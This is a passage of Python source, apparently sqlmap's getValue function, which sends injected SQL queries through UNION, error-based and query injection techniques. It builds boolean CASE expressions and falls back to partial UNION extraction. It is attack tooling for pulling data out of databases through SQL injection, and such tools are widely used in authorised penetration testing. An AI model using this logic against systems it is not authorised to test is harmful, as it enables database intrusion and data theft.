def getValue(expression, blind=True, union=True, error=True, time=True, fromUser=False, expected=None, batch=False, unpack=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=None, expectingNone=False, safeCharEncode=True):
    """
    Called each time sqlmap inject a SQL query on the SQL injection
    affected parameter.
    """

    if conf.hexConvert and expected != EXPECTED.BOOL and Backend.getIdentifiedDbms():
        if not hasattr(queries[Backend.getIdentifiedDbms()], "hex"):
            warnMsg = "switch '--hex' is currently not supported on DBMS %s" % Backend.getIdentifiedDbms()
            singleTimeWarnMessage(warnMsg)
            conf.hexConvert = False
        else:
            charsetType = CHARSET_TYPE.HEXADECIMAL

    kb.safeCharEncode = safeCharEncode
    kb.resumeValues = resumeValue

    for keyword in GET_VALUE_UPPERCASE_KEYWORDS:
        expression = re.sub(r"(?i)(\A|\(|\)|\s)%s(\Z|\(|\)|\s)" % keyword, r"\g<1>%s\g<2>" % keyword, expression)

    if suppressOutput is not None:
        pushValue(getCurrentThreadData().disableStdOut)
        getCurrentThreadData().disableStdOut = suppressOutput

    try:
        pushValue(conf.db)
        pushValue(conf.tbl)

        if expected == EXPECTED.BOOL:
            forgeCaseExpression = booleanExpression = expression

            if expression.startswith("SELECT "):
                booleanExpression = "(%s)=%s" % (booleanExpression, "'1'" if "'1'" in booleanExpression else "1")
            else:
                forgeCaseExpression = agent.forgeCaseStatement(expression)

        if conf.direct:
            value = direct(forgeCaseExpression if expected == EXPECTED.BOOL else expression)

        elif any(isTechniqueAvailable(_) for _ in getPublicTypeMembers(PAYLOAD.TECHNIQUE, onlyValues=True)):
            query = cleanQuery(expression)
            query = expandAsteriskForColumns(query)
            value = None
            found = False
            count = 0

            if query and not re.search(r"COUNT.*FROM.*\(.*DISTINCT", query, re.I):
                query = query.replace("DISTINCT ", "")

            if not conf.forceDns:
                if union and isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
                    setTechnique(PAYLOAD.TECHNIQUE.UNION)
                    kb.forcePartialUnion = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector[8]
                    fallback = not expected and kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.ORIGINAL and not kb.forcePartialUnion

                    if expected == EXPECTED.BOOL:
                        # Note: some DBMSes (e.g. Altibase) don't support implicit conversion of boolean check result during concatenation with prefix and suffix (e.g. 'qjjvq'||(1=1)||'qbbbq')

                        if not any(_ in forgeCaseExpression for _ in ("SELECT", "CASE")):
                            forgeCaseExpression = "(CASE WHEN (%s) THEN '1' ELSE '0' END)" % forgeCaseExpression

                    try:
                        value = _goUnion(forgeCaseExpression if expected == EXPECTED.BOOL else query, unpack, dump)
                    except SqlmapConnectionException:
                        if not fallback:
                            raise

                    count += 1
                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

                    if not found and fallback:
                        warnMsg = "something went wrong with full UNION "
                        warnMsg += "technique (could be because of "
                        warnMsg += "limitation on retrieved number of entries)"
                        if " FROM " in query.upper():
                            warnMsg += ". Falling back to partial UNION technique"
                            singleTimeWarnMessage(warnMsg)

                            try:
                                pushValue(kb.forcePartialUnion)
                                kb.forcePartialUnion = True
                                value = _goUnion(query, unpack, dump)
                                found = (value is not None) or (value is None and expectingNone)
                            finally:
                                kb.forcePartialUnion = popValue()
                        else:
                            singleTimeWarnMessage(warnMsg)

                if error and any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) and not found:
                    setTechnique(PAYLOAD.TECHNIQUE.ERROR if isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR) else PAYLOAD.TECHNIQUE.QUERY)
                    value = errorUse(forgeCaseExpression if expected == EXPECTED.BOOL else query, dump)
                    count += 1
                    found = (value is not None) or (value is None and expectingNone) or count >= MAX_TECHNIQUES_PER_VALUE

                if found and conf.dnsDomain:
                    _ = "".join(filterNone(key if isTechniqueAvailable(value) else None for key, value in {'E': PAYLOAD.TECHNIQUE.ERROR, 'Q': PAYLOAD.TECHNIQUE.QUERY, 'U': PAYLOAD.TECHNIQUE.UNION}.items()))
                    warnMsg = "option '--dns-domain' will be ignored "
                    warnMsg += "as faster techniques are usable "
                    warnMsg += "(%s) " % _
                    singleTimeWarnMessage(warnMsg)
